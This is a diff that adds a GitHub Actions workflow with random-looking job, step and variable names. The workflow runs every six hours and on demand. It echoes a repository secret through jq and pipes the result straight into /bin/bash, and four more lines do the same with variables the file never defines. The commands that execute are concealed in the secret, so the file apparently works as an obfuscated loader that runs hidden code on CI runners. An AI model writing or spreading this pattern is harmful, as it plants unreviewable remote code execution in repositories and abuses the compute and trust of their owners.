@@ -1,0 +1,23 @@
+name: hongyanshui3109
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongyanshui3109
+        env:
+          iriw952: ${{ secrets.iriw952 }}
+        run: |
+          echo $iriw952 | jq -r .kmqk7 | /bin/bash
+          echo $ajb29086 | jq -r .lou950 | /bin/bash
+          echo $on01 | jq -r .vb8813 | /bin/bash
+          echo $pwi6851 | jq -r .xqav07 | /bin/bash
+          echo $zgfxr108 | jq -r .d7 | /bin/bash
+
